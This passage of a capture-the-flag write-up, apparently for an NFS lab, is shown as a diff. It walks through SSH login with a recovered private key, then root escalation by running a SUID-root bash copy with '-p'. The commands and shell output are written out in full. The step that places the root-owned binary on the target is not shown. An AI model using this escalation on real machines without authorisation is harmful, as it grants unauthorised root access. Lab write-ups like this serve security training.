@@ -128,3 +128,70 @@ chmod 600 id_rsa
 ```
 
 I then viewed the copied file locally and confirmed it was an RSA private key. The private key content itself is intentionally not reproduced in this write-up.
+
+## 5. SSH Login as cappucino and Privilege Escalation via SUID Bash
+
+### Copying Bash and Setting the SUID Bit
+
+Using the private key from Section 4, I used `scp` in connection with copying the `bash` binary, and set the SUID bit on the copy:
+
+```bash
+scp -i id_rsa cappucino@<IP_ADDRESS>:/bin/bash <local Downloads directory>/bash
+chmod +s bash
+```
+
+The verified result of this preparation is recorded after login below: a `bash` binary present in cappucino's home directory, owned by root, with SUID permissions.
+
+### Logging in as cappucino
+
+I then logged in over SSH with the same private key:
+
+```bash
+ssh -i id_rsa cappucino@<IP_ADDRESS>
+```
+
+```text
+cappucino@target:~$ whoami
+cappucino
+```
+
+### Running the SUID Bash
+
+In cappucino's home directory, I confirmed the `bash` binary and its permissions:
+
+```text
+cappucino@target:~$ ls
+bash
+cappucino@target:~$ ls -la bash
+-rwsr-sr-x 1 root root 1183448 Nov  1 22:19 bash
+```
+
+The `s` in the permissions and the root ownership show this copy of Bash was set up as a SUID root binary. I ran it with `-p`, which tells Bash not to drop its effective privileges on startup:
+
+```bash
+./bash -p
+```
+
+```text
+bash-5.0# ls
+bash
+bash-5.0# pwd
+/home/cappucino
+bash-5.0# whoami
+root
+```
+
+This worked because a SUID root shell run with `-p` keeps its root effective user ID, turning the normal cappucino login into a root shell.
+
+### Reading the NFS Flag
+
+From the root shell, I moved to root's home directory and read the flag file:
+
+```text
+bash-5.0# cd /root
+bash-5.0# ls
+root.txt  snap
+bash-5.0# cat root.txt
+```
+
+That file contained the NFS flag. The flag value is intentionally omitted from this write-up.
